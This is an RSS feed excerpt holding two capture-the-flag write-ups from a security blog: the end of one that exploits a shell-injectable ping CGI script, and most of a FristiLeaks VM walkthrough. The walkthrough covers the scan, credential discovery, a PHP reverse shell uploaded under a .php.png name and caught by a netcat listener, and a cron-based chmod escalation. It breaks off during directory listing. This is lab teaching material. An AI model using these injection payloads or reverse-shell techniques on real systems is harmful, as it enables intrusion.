        &lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ping -c 1 &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Error running &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ping -c 1 &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;

  &amp;amp;lt;form method=&quot;post&quot; action=&quot;index.cgi&quot;&amp;amp;gt;
    &amp;amp;lt;p&amp;amp;gt;Ping destination: &amp;amp;lt;input type=&quot;text&quot; name=&quot;dest&quot;/&amp;amp;gt;&amp;amp;lt;/p&amp;amp;gt;
  &amp;amp;lt;/form&amp;amp;gt;

  &amp;amp;lt;p&amp;amp;gt;Ping results:&amp;amp;lt;/p&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;
  &amp;amp;lt;pre&amp;amp;gt;%s&amp;amp;lt;/pre&amp;amp;gt;

  &amp;amp;lt;img src=&quot;../img/cat.jpg&quot;/&amp;amp;gt;

&amp;amp;lt;/body&amp;amp;gt;

&amp;amp;lt;/html&amp;amp;gt;
&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cgi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;escape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;flag&quot;&gt;Flag&lt;/h2&gt;

&lt;p&gt;Entering &lt;code&gt;dest=%0afind&lt;/code&gt; listed the current directory, revealing the path of the flag.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8.8.8.8%0acat&amp;lt;./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Flag contents:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;INS&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;warm_kitty_smelly_kitty_flush_flush_flush&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the CTF :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>FristiLeaks 1.3 Walkthrough</title>
          <link>https://highon.coffee/blog/fristileaks-walkthrough/</link>
          <pubDate>Tue, 15 Dec 2015 00:00:00 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/fristileaks-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port Scanning&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#http-enumeration&quot; id=&quot;markdown-toc-http-enumeration&quot;&gt;HTTP Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#php-reverse-shell&quot; id=&quot;markdown-toc-php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-enumeration&quot; id=&quot;markdown-toc-local-enumeration&quot;&gt;Local Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#homeadmin&quot; id=&quot;markdown-toc-homeadmin&quot;&gt;/home/admin&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege Escalation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#root-flag&quot; id=&quot;markdown-toc-root-flag&quot;&gt;Root Flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..&lt;/p&gt;

&lt;div class=&quot;note warning&quot;&gt;
  &lt;h5&gt;VMWare Users - MAC Address&lt;/h5&gt;
  &lt;p&gt;If you are a VMWare user, you'll need to manually set the MAC Address to &lt;code&gt;08:00:27:A5:A6:76&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 192.168.221.150&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;

&lt;p&gt;Enumeration of the web application, revealed the page &lt;code&gt;/fristi&lt;/code&gt; with the following form:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/fristileaks/webform.png&quot; alt=&quot;webform&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Page source interrogation revealed the following code comment:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
TODO:
We need to clean this up &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;production. I left some junk &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;here to make testing easier.

- by eezeepz
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The following base64 encoded image was also discovered and decoded to reveal an image containing the string: &lt;code&gt;keKkeKKeKKeKkEkkEk&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;U5ErkJggg==&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decode&lt;/span&gt;
 1274&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;U5ErkJggg==&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; image.png&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The following credentials were used to login to the web application:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Username&lt;/th&gt;
      &lt;th&gt;Password&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;b&gt;eezeepz&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;keKkeKKeKKeKkEkkEk&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/h2&gt;

&lt;p&gt;The file name &lt;code&gt;shell.php.png&lt;/code&gt; was used to bypass the web application filtering, the file was still executed as PHP (likely due to incorrectly configured Apache MIME types). A reverse shell successfully connected back to a netcat listener.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# netcat &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.139] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.150] 34400
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 &lt;span class=&quot;c&quot;&gt;#1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
 18:26:33 up  5:37,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;48&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;apache&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;48&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;apache&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;48&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;apache&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
sh: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
sh-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
whoami
&lt;/span&gt;apache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-enumeration&quot;&gt;Local Enumeration&lt;/h2&gt;

&lt;p&gt;Enumeration of the users home dir found several binary files and the following txt file:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sh-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;notes
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;notes.txt
Yo EZ,

I made it possible &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you to &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;some automated checks,
but I did only allow you access to /usr/bin/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; system binaries. I did
however copy a few extra often needed commands to my
homedir: &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;df&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;, ps, &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;, egrep so you can use those
from /home/admin/

Don&lt;span class=&quot;s1&quot;&gt;'t forget to specify the full path for each binary!

Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The
output goes to the file &quot;cronresult&quot; in /tmp/. It should
run every minute with my account privileges.

- Jerry&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The following directory traversal (the command had to originate from /usr/bin/) was used to set the permissions for &lt;code&gt;/home/admin&lt;/code&gt; &lt;strong&gt;world readable&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/usr/bin/../../bin/chmod -R 777 /home/admin&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/runthis&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;homeadmin&quot;&gt;/home/admin&lt;/h3&gt;

&lt;p&gt;Inspection of &lt;code&gt;/home/admin&lt;/code&gt; disclosed the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sh-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/admin
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/admin
sh-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 652
drwxrwxrwx. 2 admin     admin       4096 Nov 19 02:03 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 5 root      root        4096 Nov 19 01:40 ..
